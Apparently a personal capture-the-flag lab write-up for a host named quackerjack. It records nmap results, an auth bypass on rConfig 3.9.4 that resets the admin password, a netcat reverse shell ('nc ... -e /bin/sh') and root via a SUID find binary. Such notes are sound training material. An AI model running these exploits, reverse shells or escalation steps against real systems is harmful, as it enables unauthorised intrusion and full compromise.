## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.190.57
# HOSTNAME
quackerjack
# OPERATING SYSTEM

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.2

22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)

80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
8081/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)

111/tcp  open  rpcbind     syn-ack ttl 61 2-4 (RPC #100000)

139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.10.4 (workgroup: SAMBA)

3306/tcp open  mysql       syn-ack ttl 61 MariaDB (unauthorized)
```
# ENUMERATION
## PORT 8081
```bash 
- From ssl certificate
	- root@quackerjack
- Found https://192.168.190.57:8081/login.php
	- rConfig Version 3.9.4 
```
## INITIAL FOOTHOLD
```bash
# Found many exploits for rconfig version  3.9.4
- rConfig 3.9.4 - 'search.crud.php' Remote Command Injection| php/webapps/48241.py
	- Required authentication username and password
- rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution| php/webapps/48261.py
	- Didn't work sadly

- rConfig 3.9.5 - Remote Code Execution (Unauthenticated)| php/webapps/48878.py
python3 48878.py
Connecting to: https://192.168.190.57:8081/
Connect back is set to: nc 192.168.45.221 9001 -e /bin/sh, please launch 'nc -lv 9001'
Version is rConfig Version 3.9.4 it may not be vulnerable
Remote Code Execution + Auth bypass rConfig 3.9.5 by Daniel Monzón
In the last stage if your payload is a reverse shell, the exploit may not launch the success message, but check your netcat ;)
Note: preferred method for auth bypass is 1, because it is less 'invasive'
Note2: preferred method for RCE is 2, as it does not need you to know if, for example, netcat has been installed in the target machine
Choose method for authentication bypass:
        1) User creation
        2) User enumeration + User edit
Method>2
(+) The admin user is present in this rConfig instance
(+) The new password for the admin user is Testing1@
Choose method for RCE:
        1) Unsafe call to exec()
        2) Template edit
Method>2
(+) Log in as admin completed
(+) File created
(+) Command results:                                                                          
<?php echo system('ls');?> 

- exploit 48878.py created creds admin:Testing1@
	- Tried to login using creds admin:Testing1@
		- Worked

- rConfig 3.9.4 - 'search.crud.php' Remote Command Injection| php/webapps/48241.py
	- Since credentials are available executed the exploit

python3 48241.py https://192.168.190.57:8081 admin 'Testing1@' 192.168.45.221 8081

sudo nc -nvlp 8081
listening on [any] 8081 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.190.57] 59970
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)

```
## PRIVILEGE ESCALATION
```bash
# SUID
bash-4.2$ find / -perm -u=s -type f 2>/dev/null                                               
/usr/bin/find                                    

# GTFOBINS
bash-4.2$ find . -exec /bin/sh -p \; -quit
sh-4.2# id
uid=48(apache) gid=48(apache) euid=0(root) groups=48(apache)
sh-4.2# whoami
root

# root
```
# NOTE
```bash
- Learn to chain and use multiple exploits
```

# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Mon Dec  2 21:35:23 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.190.57
Nmap scan report for 192.168.190.57
Host is up, received echo-reply ttl 61 (0.041s latency).
Scanned at 2024-12-02 21:35:25 IST for 190s
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.221
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCWsUPf+lVe3JddBDNBbM3vSxW2Nbl7ZniBHSy2r7B9KN42uteBJeZtPoxcBGPEcUv4ZZQ7CrIyKEqNjpz4QfryIb9Ta4ehTJNumQCXV2r2VsLDYCK0C+FjOwc++o/iqUOPm48NNO3s//vhb33VZ1g5dnEnXQ68jdJ3G382+cVfcWj6WSZLS1hk7HLq2lYrTZD6krJ1eEZxgIb6YiXnSruEtntEpiEy5c92yh3KFnvVhgwNJe/WyNpXLrE4I66lX5EWhTAhw/6373RL/3efGsptmwhb7wrMXdscic/JOmUMUKYPRVl7KGMik0kjVH/rXpEpTjUONQ+3DhuT7khuB5MF
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMT94WFh/L5UMkSoHb0Obh3JTETeKzHNMKfnuJleky0X/AEbM+TV5WCsd7GcWfhfsFxK1xyK9iyNzmKmShy3Fk8=
|   256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIANg5sdcd3U3DkheWc10jhSTJbOSE7Lqtyu+yQhLuywl
80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
111/tcp  open  rpcbind     syn-ack ttl 61 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       syn-ack ttl 61 MariaDB (unauthorized)
8081/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: 400 Bad Request
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: QUACKERJACK; OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18560/tcp): CLEAN (Timeout)
|   Check 2 (port 45082/tcp): CLEAN (Timeout)
|   Check 3 (port 55915/udp): CLEAN (Timeout)
|   Check 4 (port 30394/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-12-02T16:07:56
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: quackerjack
|   NetBIOS computer name: QUACKERJACK\x00
|   Domain name: \x00
|   FQDN: quackerjack
|_  System time: 2024-12-02T11:08:00-05:00
|_clock-skew: mean: 1h40m01s, deviation: 2h53m16s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec  2 21:38:35 2024 -- 1 IP address (1 host up) scanned in 191.96 seconds

```

